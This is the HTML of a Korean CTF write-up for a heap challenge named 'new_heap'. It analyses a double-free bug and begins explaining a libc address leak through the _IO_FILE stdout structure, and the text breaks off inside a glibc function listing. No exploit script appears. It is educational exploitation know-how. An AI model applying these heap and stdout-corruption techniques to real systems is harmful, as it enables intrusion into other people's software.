before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">new_heap<span class=\"token punctuation\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared <span class=\"token builtin\">object</span>\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token number\">.32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>d8a6eae195909da34581c15b13d84d41ebeeab2e\nstripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7ffb000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff77e1000</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t   <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7dd5000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호-기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\" aria-label=\"보호 기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호 기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> <span class=\"token string\">'/home/Zer0Luck/challenges/new_heap/new_heap'</span>\n    Arch<span class=\"token punctuation\">:</span>     amd64<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token operator\">-</span>little\n    RELRO<span class=\"token punctuation\">:</span>    Full RELRO\n    Stack<span class=\"token punctuation\">:</span>    Canary found\n    NX<span class=\"token punctuation\">:</span>       NX enabled\n    PIE<span class=\"token punctuation\">:</span>      PIE enabled</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/klEQVQoz52RzW7DIBCE/f6vWEWV2kiO7GBsWGDZPyLiNsrBh7qjEZdl9DHs4CMnYCxNuB3JWlN7ujVTE1bqFjKT4Xus1ys5V9XMrNnr7LGWKN+zm2Ca05y5xApzml12S16A0uBWnGcg4n7/pIZc1S8yju124xhVRN/HVeqK64Zblfpbw3b3MIqtK10uZRxp24RInz1/REpAABVI6YhMndyxgU8/O2aOgSpzqbi3RsQ/9h+QzS/68Rm/xi3GCkBE8hoj45IXX7wv/iCcUBLQNFFOwqzC+o5VU1befRAOmd0dQxBIUgqd6wxFElgILSU9u+r+Ye2/Ggp32r74s+EHeXv/T7g5FacAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png\"\n        srcset=\"/static/7d27dc209a6ccc4d097443af38f803ca/e9ff0/0.png 180w,\n/static/7d27dc209a6ccc4d097443af38f803ca/f21e7/0.png 360w,\n/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png 655w\"\n        sizes=\"(max-width: 655px) 100vw, 655px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">print_menu</code> 함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"alloc\" style=\"position:relative;\"><a href=\"#alloc\" aria-label=\"alloc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>alloc</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABP0lEQVQoz42S227bMAyG/f6vuC7DsnR2oliRRNEUT9LQLKi7dYcSgm6ID/8BnOaQASriViuWAiI63k0f/f0bY0znFU+ntCwtBAlBYhzb9rL8yEyXG+XUYqQCPaWRs9XaW3vQ5lalZs6lFRQEBhCoUqtUUpquiWkTbhZXBRhEymzuD1hdq9TCpXAhJeAX8udfpU7IHq9+XmGFND7mdrdN6jn1SyAx7vesbwM/6un9j51N4WYlOzAUbKrD/K/qryXvyt8v/vTJT3M7PbfjUUuRX4De1VW7enfv/rvtcOOUDHFsqOvKqsN9d87GM8xzneMWM2dkNLcdLls/fB6HIzzH6+Er5mQAwixm7jbk3nZqCQVRMFJU369oyujLbMsiT1/4W7gUQCJqjVozIu//PJfpHAkrNxoi/Z7xPz25u+pD/AcLC76IaaFjPgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png\"\n        srcset=\"/static/1065ae685e1e928c28f52c7e47c62a3f/e9ff0/1.png 180w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/f21e7/1.png 360w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png 642w\"\n        sizes=\"(max-width: 642px) 100vw, 642px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>메모리 동적할당 과정을 확인해 보면 전역 포인터 배열 <code class=\"language-text\">heap_ptr</code> 에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다.</li>\n<li>사용자의 입력값이 <code class=\"language-text\">0x78</code> 이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다.</li>\n</ul>\n<h2 id=\"free\" style=\"position:relative;\"><a href=\"#free\" aria-label=\"free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAzUlEQVQY051OQW7DMAzz/1+yP63Y2qYN1qRObNlSZNmWh7ko0AE7BCN4IESRoLnMbytcFy/Eip2BCqX8SkyCSbr4dTdrOHj3AVQCkSTNuUlqO2GmpUy39nkOx0ucJym5vtra1JJ9t4fBDZAgCsYUUUib/oQtMPjiAt09ANISfNiwWz2sSkKevWO35Q0YHLuYomoPR67jVcd54UqlZswRKKjum/11l9NxG05tvOG8Bq1/PGnTx86H0OcwYyExZ8QWmZCpVm27YTDVXvkffAOVlNRmwmJTZQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png\"\n        srcset=\"/static/1869ca93d30719e9422c46ece04e30c4/e9ff0/2.png 180w,\n/static/1869ca93d30719e9422c46ece04e30c4/f21e7/2.png 360w,\n/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다.</li>\n<li>하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다.</li>\n</ul>\n<h2 id=\"memory-leak-idea\" style=\"position:relative;\"><a href=\"#memory-leak-idea\" aria-label=\"memory leak idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>memory leak Idea</h2>\n<ul>\n<li>어떻게 하면 메모리 주소값을 릭할 수 있을 까?</li>\n<li>힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다.</li>\n</ul>\n<h2 id=\"_io_file_stdout\" style=\"position:relative;\"><a href=\"#_io_file_stdout\" aria-label=\"_io_file_stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_FILE_stdout</h2>\n<ul>\n<li><code class=\"language-text\">stdout</code> 파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수많은 멤버 변수가 정의되어 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* High-order word -> _IO_MAGIC, 나머지는 플래그 */</span>\n  <span class=\"token comment\">/* 다음 포인터는 C++ streambuf 프로토콜에 해당한다. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼에 대한 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼 주소의 끝을 가리키는 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of putback+get area.,\n 파일 읽기 버퍼 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼의 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 쓰기 버퍼에 대한 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of reserve area. 준비 구역의 시작 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 준비 구역의 끝 */</span>\n  <span class=\"token comment\">/* 다음 필드는 백업 및 실행 취소를 지원하는데 사용된다.*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span> \n  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span>\n  __off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span>\n  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>_IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"stdout\" style=\"position:relative;\"><a href=\"#stdout\" aria-label=\"stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>stdout</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x7ffff7dd0760</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">></span><span class=\"token operator\">:</span>       <span class=\"token number\">0x00000000fbad2887</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0770</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0780</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0790</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd07a0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e4</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07b0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">80</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07c0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">96</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcfa00</span>\n<span class=\"token number\">0x7ffff7dd07d0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">112</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000001</span>      <span class=\"token number\">0xffffffffffffffff</span>\n<span class=\"token number\">0x7ffff7dd07e0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">128</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x000000000a000000</span>      <span class=\"token number\">0x00007ffff7dd18c0</span>\n<span class=\"token number\">0x7ffff7dd07f0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">144</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0xffffffffffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0800</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">160</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00007ffff7dcf8c0</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0810</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">176</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0820</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">192</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00000000ffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0830</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">208</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcc2a0</span></code></pre></div>\n<ul>\n<li>printf, puts와 같은 stdout 파일 디스크립터를 사용하는 함수가 호출될 때 내부적으로 <code class=\"language-text\">_IO_new_do_write</code> 함수가 호출된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI1x3GSQ6CMAAAQB4ji5RuQEvpRhcKxeBBTUxM/P87TJzTFFa7PZ8m7sJ4EzYTNrWsNmaXDht37ZK0YbbBpUP7pFzUPpmwzzaggRfLdnt9vufzbWNWLnFlJ+2ECZPxk/aUSUDGFg94FITNsOddz/EoABkBZYVcYj4f63Fn0rR4qDtSAdxAekV92aIa4KrDDSRliy5XVEP6D2wgrQD+AX+TKAXqDJjcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png\"\n        srcset=\"/static/ddb40862e7ea005b1c65709846244bc6/e9ff0/3.png 180w,\n/static/ddb40862e7ea005b1c65709846244bc6/f21e7/3.png 360w,\n/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png 720w,\n/static/ddb40862e7ea005b1c65709846244bc6/302a4/3.png 1080w,\n/static/ddb40862e7ea005b1c65709846244bc6/0f246/3.png 1118w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">puts</code> 함수를 호출할 때 <code class=\"language-text\">_IO_new_file_xsputn</code> 함수를 호출하고 해당 함수에서 다음과 같이 <code class=\"language-text\">new_do_write</code> 함수를 호출하게 된다.</li>\n</ul>\n<h2 id=\"_io_new_file_xsputn-함수\" style=\"position:relative;\"><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\" aria-label=\"_io_new_file_xsputn 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_new_file_xsputn 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">_IO_size_t\n<span class=\"token function\">_IO_new_file_xsputn</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span>f<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> _IO_size_t n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_write<span class=\"token punctuation\">)</span>\n\t<span class=\"token 